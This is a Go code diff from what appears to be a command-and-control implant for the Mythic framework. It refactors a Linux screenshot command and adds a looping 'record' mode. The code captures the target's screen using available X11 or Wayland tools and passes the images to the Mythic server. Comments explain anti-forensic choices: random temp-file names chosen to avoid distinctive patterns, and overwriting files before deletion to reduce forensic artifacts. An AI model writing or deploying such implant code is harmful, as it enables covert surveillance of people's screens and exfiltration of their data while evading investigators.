@@ -23,57 +23,16 @@ func (c *ScreenshotLinuxCommand) Description() string {
 }
 
 func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResult {
-	// Check for display server
-	display := os.Getenv("DISPLAY")
-	waylandDisplay := os.Getenv("WAYLAND_DISPLAY")
+	params := parseScreenshotParams(task)
 
-	if display == "" && waylandDisplay == "" {
-		return errorResult("No display server detected (DISPLAY and WAYLAND_DISPLAY not set). Screenshot requires a graphical session.")
+	if params.Action == "record" {
+		return screenshotRecordLoop(task, captureScreenLinux, params)
 	}
 
-	// Create temp file for screenshot — random name (no distinctive pattern)
-	tf, tfErr := os.CreateTemp("", "")
-	if tfErr != nil {
-		return errorf("Error creating temp file: %v", tfErr)
-	}
-	tmpFile := tf.Name()
-	tf.Close()
-
-	// Try screenshot tools in order of preference
-	var err error
-	if waylandDisplay != "" {
-		// Wayland: try grim first, then gnome-screenshot
-		err = tryScreenshotTools(tmpFile, []screenshotTool{
-			{"grim", []string{tmpFile}},
-			{"gnome-screenshot", []string{"-f", tmpFile}},
-		})
-	} else {
-		// X11: try several tools
-		err = tryScreenshotTools(tmpFile, []screenshotTool{
-			{"import", []string{"-window", "root", tmpFile}},
-			{"scrot", []string{tmpFile}},
-			{"gnome-screenshot", []string{"-f", tmpFile}},
-			{"xfce4-screenshooter", []string{"-f", "-s", tmpFile}},
-		})
-	}
-
+	// Single screenshot
+	imgData, err := captureScreenLinux()
 	if err != nil {
-		secureRemove(tmpFile)
-		return errorf("Screenshot failed: %v\nEnsure a screenshot tool is installed (import/scrot/gnome-screenshot for X11, grim for Wayland)", err)
-	}
-
-	// Read the screenshot file
-	imgData, err := os.ReadFile(tmpFile)
-	if err != nil {
-		secureRemove(tmpFile)
-		return errorf("Error reading screenshot file: %v", err)
-	}
-
-	// Clean up temp file — overwrite before removal to reduce forensic artifacts
-	secureRemove(tmpFile)
-
-	if len(imgData) == 0 {
-		return errorResult("Screenshot captured but file was empty (no display available?)")
+		return errorf("Error: %v", err)
 	}
 
 	// Send screenshot to Mythic
@@ -99,6 +58,55 @@ func (c *ScreenshotLinuxCommand) Execute(task structs.Task) structs.CommandResul
 			}
 		}
 	}
+}
+
+// captureScreenLinux captures a screenshot using available X11/Wayland tools.
+func captureScreenLinux() ([]byte, error) {
+	display := os.Getenv("DISPLAY")
+	waylandDisplay := os.Getenv("WAYLAND_DISPLAY")
+
+	if display == "" && waylandDisplay == "" {
+		return nil, fmt.Errorf("no display server detected (DISPLAY and WAYLAND_DISPLAY not set)")
+	}
+
+	tf, tfErr := os.CreateTemp("", "")
+	if tfErr != nil {
+		return nil, fmt.Errorf("creating temp file: %v", tfErr)
+	}
+	tmpFile := tf.Name()
+	tf.Close()
+
+	var err error
+	if waylandDisplay != "" {
+		err = tryScreenshotTools(tmpFile, []screenshotTool{
+			{"grim", []string{tmpFile}},
+			{"gnome-screenshot", []string{"-f", tmpFile}},
+		})
+	} else {
+		err = tryScreenshotTools(tmpFile, []screenshotTool{
+			{"import", []string{"-window", "root", tmpFile}},
+			{"scrot", []string{tmpFile}},
+			{"gnome-screenshot", []string{"-f", tmpFile}},
+			{"xfce4-screenshooter", []string{"-f", "-s", tmpFile}},
+		})
+	}
+
+	if err != nil {
+		secureRemove(tmpFile)
+		return nil, fmt.Errorf("screenshot failed: %v (install import/scrot/gnome-screenshot for X11, grim for Wayland)", err)
+	}
+
+	imgData, err := os.ReadFile(tmpFile)
+	secureRemove(tmpFile)
+	if err != nil {
+		return nil, fmt.Errorf("reading screenshot file: %v", err)
+	}
+
+	if len(imgData) == 0 {
+		return nil, fmt.Errorf("screenshot captured but file was empty")
+	}
+
+	return imgData, nil
 }
 
 type screenshotTool struct {
